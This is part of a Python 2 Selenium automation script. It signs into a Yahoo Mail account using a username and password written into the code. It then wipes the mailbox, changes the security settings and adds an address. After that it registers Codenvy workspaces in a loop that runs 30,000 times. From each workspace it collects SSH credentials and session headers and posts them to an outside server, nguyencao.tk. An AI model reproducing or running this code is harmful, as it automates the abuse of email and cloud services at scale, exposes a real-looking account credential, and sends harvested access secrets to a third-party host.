                driver.find_elements_by_xpath("//*[contains(text(), 'Settings')]")[0].click()
            except :
                time.sleep(5)
                driver.find_element_by_id('yucs-help_button').click()
                driver.find_elements_by_xpath("//*[contains(text(), 'Settings')]")[0].click()
        except :
            time.sleep(5)
            try:
                driver.find_element_by_id('yucs-help_button').click()
                time.sleep(2)
                driver.find_elements_by_xpath("//*[contains(text(), 'Settings')]")[0].click()
            except :
                time.sleep(5)
                driver.find_element_by_id('yucs-help_button').click()
                time.sleep(1)
                driver.find_elements_by_xpath("//*[contains(text(), 'Settings')]")[0].click()
        time.sleep(4)
        driver.find_elements_by_xpath("//*[contains(text(), 'Security')]")[0].click()
    except : 
        return 0
    return 1

def enable_setting1(driver):
    try:
        try:
            try:
                driver.find_element_by_id('yucs-help_button').click()
                driver.find_elements_by_xpath("//*[contains(text(), 'Settings')]")[0].click()
            except :
                time.sleep(5)
                driver.find_element_by_id('yucs-help_button').click()
                driver.find_elements_by_xpath("//*[contains(text(), 'Settings')]")[0].click()
        except :
            time.sleep(5)
            try:
                driver.find_element_by_id('yucs-help_button').click()
                time.sleep(1)
                driver.find_elements_by_xpath("//*[contains(text(), 'Settings')]")[0].click()
            except :
                time.sleep(5)
                driver.find_element_by_id('yucs-help_button').click()
                time.sleep(1)
                driver.find_elements_by_xpath("//*[contains(text(), 'Settings')]")[0].click()
        time.sleep(4)
        driver.find_elements_by_xpath("//*[contains(text(), 'Security')]")[0].click()
    except : 
        return 0
    return 1


def delete_email(driver):
    cks = driver.find_elements_by_xpath("//input[@type=\"checkbox\"]")
    for ck in cks:
        if 'Select or deselect all messages' in ck.get_attribute('title'):
            ck.click()
            time.sleep(7)
            driver.find_element_by_id('btn-delete').click()
            time.sleep(7)
            driver.find_element_by_id('okModalOverlay').click()
            return 1
    return 0


# driver = webdriver.Firefox()

# driver.get('https://login.yahoo.com/?.src=ym&.intl=us&.lang=en-US&.done=https%3a//mail.yahoo.com')
# driver.find_element_by_id('login-username').send_keys('daipaw0001')
# driver.find_element_by_id('login-signin').click()
# time.sleep(8)
# driver.find_element_by_id('login-passwd').send_keys('hoolders01')
# driver.find_element_by_id('login-signin').click()
# time.sleep(8)
######## DETELE EMAIL #########
# delete_email(driver)
######## ENABLE SETTING #########
# enable_setting(driver)
###### REMOVE EMAIL #########
# remove_email(driver)
###### ADD EMAIL #########
#####add_email(driver,33,35)
# add_email_costum(driver)
###### GET URL #########
# time.sleep(40)
# get_email_url(driver)


# driver.quit()




def ok2(yyyy):
    print '---------- >> ',yyyy,' << -------------'
    try : 
        driver = webdriver.Firefox(executable_path='/root/geckodriver')
        driver.get('https://login.yahoo.com/?.src=ym&.intl=us&.lang=en-US&.done=https%3a//mail.yahoo.com')
        driver.find_element_by_id('login-username').send_keys('daipaw0001')
        driver.find_element_by_id('login-signin').click()
        time.sleep(8)
        driver.find_element_by_id('login-passwd').send_keys('hoolders01')
        driver.find_element_by_id('login-signin').click()
        time.sleep(8)
        ######### DETELE EMAIL #########
        print "--- delete ---"
        try:
            if yyyy % 5 == 0 : 
                delete_email(driver)
                os.system('sync && echo 3 > /proc/sys/vm/drop_caches')
        except Exception as e: 
            print str(e)
        ######### ENABLE SETTING #########
        print "--- settings ---"
        oksetting = 0 
        for check_st in range(10):
            try :
                oksetting = enable_setting(driver)
                if oksetting : 
                    break
            except : 
                pass
        if not oksetting:
            return 0
        ####### REMOVE EMAIL #########
        print "--- remove email---"
        remove_email(driver)
        ####### ADD EMAIL #########
        print "--- add email ---"
        # add_email(driver,33,35)
        addEmailCT = add_email_costum(driver)
        if not addEmailCT : 
            driver.quit()
            return 0
        ####### GET URL #########
        print "--- get url ---"
        time.sleep(10)
        url = email = ""
        if check_receive_email(driver) :
            url,email = get_email_url_costum(driver)
        #ee=requests.get('https://nguyencao.tk/codenvy/')
        #email = re.findall('email:([^;]+);url:(.+)$',ee.text)[0][0]
        #url = re.findall('email:([^;]+);url:(.+)$',ee.text)[0][1]
        pname='cao'
        step1 = step2 = step3 = step4 = step41 = step5 = step6 =step7 = 0
        text = sshdoc = ''
        ### 1: setup
        driver.execute_script("window.open('');")
        driver.switch_to_window(driver.window_handles[1])
        driver.switch_to_window(driver.window_handles[0])
        ### 2: create acc
        # url,email=get_url_token1(driver)
        ### 3: inscription
        if url:
            step1 = onpage_1_inscr(driver,url)
        ### 4 :  create workspace
        if step1:
            step4 = onpage_2_workspace(driver)
            switch_iframe(driver)
            step41 = recheck_onpage_2_workspace(driver)
        ### 5 get ssh
        try:
            sshdoc = get_ssh(driver)
        except :
            pass
        if sshdoc : 
            step4 = 1
        ### 6 create project
        if step4 :
            step6 = create_project(driver,pname)
        ### 7 create file .py
        if step6 : 
            step7 = create_pfile(driver,"loulou")
            if not step7: 
                time.sleep(4)
                step7 = create_pfile(driver,"loulou")
        ### 8 get headers
        if step7 :
            text = get_header(driver)
        ### 9 create file f5.py
        if text :
            update_pw(driver,email)
        if not sshdoc :
            sshdoc = get_ssh(driver)
        if text and step7 and step6: 
            da={'text': text, 'sshdoc': sshdoc, 'email': email}
            zz=requests.post('https://nguyencao.tk/codenvy/',data=da)
        driver.quit()
    except :
        driver.quit()




for yyyy in range(30000):
    try:
        ok2(yyyy)
    except Exception as e:
        print str(e)



